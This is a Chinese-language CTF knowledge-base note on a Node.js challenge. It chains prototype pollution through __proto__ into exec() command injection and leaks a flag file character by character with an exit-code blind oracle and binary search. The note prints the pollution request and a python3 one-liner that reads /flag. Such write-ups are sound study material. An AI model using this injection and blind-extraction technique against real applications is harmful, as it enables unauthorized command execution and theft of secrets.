---
title: Node.js 原型链污染 + 命令注入盲外带
category: web
tags: [prototype-pollution, nodejs, command-injection, blind-exfiltration, binary-search]
triggers: [原型链污染, __proto__, prototype pollution, exec(), command injection, 盲外带, blind oracle, exit code oracle]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/JUST_PROTO.md]
---

## Summary

Node.js 应用原型链污染（`__proto__`）结合 `exec()` 命令注入，在网络隔离环境下通过 exit code 盲 oracle 逐字符外带数据。

## Key Points

- `date[token][key] = val` 模式是原型链污染点
- 网络隔离环境无法回连外带，需用 exit code 盲 oracle
- 二分搜索比线性扫描快 ~10 倍（每字符 7 次 vs 39 次请求）
- 注意 URL 编码和命令分隔符的选择（`\n` 比 `;` 更可靠）

## Details

### 攻击流程

1. 审计 JS 代码找到原型链污染点 + 命令注入点
2. 通过 `__proto__` 污染 `redis_set` 属性注入 payload
3. 触发命令执行端点
4. 用 `python3 -c "subprocess.run(...);exit(0 if ... else 1)"` 做盲 oracle
5. 二分搜索逐字符读取 flag

### 核心命令

```
# 原型污染注入
GET /set?token=__proto__&key=redis_set&val=<payload>#

# 盲 oracle: exit code 二分
python3 -c "import subprocess;f=subprocess.run(['cat','/flag'],capture_output=True).stdout;exit(0 if len(f)>N and f[N]>=M else 1)"#
```

## Connections

- Related: [[nodejs-security]] (future page)
- GHSA: [[web/ghsa-rce-overview]] (Node.js RCE 模式)
